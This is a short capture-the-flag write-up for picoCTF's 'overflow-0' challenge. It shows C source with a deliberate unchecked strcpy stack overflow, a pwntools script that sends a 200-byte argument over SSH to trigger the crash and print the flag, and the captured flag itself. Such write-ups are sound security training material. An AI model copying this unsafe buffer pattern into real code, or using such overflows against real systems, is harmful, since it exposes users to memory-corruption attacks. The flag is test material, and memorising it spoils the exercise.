# overflow-0
```cpp
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  fprintf(stderr, "%s\n", flag);
  fflush(stderr);
  exit(1);
}

void vuln(char *input){
  char buf[128];
  strcpy(buf, input);
}

int main(int argc, char **argv){
  
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }
  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  
  if (argc > 1) {
    vuln(argv[1]);
    printf("You entered: %s", argv[1]);
  }
  else
    printf("Please enter an argument next time\n");
  return 0;
}
```
Our goal is to print the flag. Therefor we should run `sigsegv_handler`. The `signal` function makes it called on `SIGSEGV` or SegFault. The `strcpy` Function doesn't check that `input` can fit into `vuln`. Therefor by having `argv[1]` be larger than the lenght of `buf` (128), we can print the flag
```python
from os import environ
from pwn import *

PATH='/problems/overflow-0_0_6d0c88d7d40bc281760b515cb6a4660a/'
EXEC=PATH+'vuln'
s = ssh(host='2019shell1.picoctf.com',
        user=environ["PICOUSER"],
        password=environ["PICOPSWD"])

sh = s.process([EXEC, "A"*200], cwd=PATH)

x = sh.recvrepeat()

print(x.decode(errors='ignore'))

s.close()
```
flag: `picoCTF{3asY_P3a5y0a131490}`
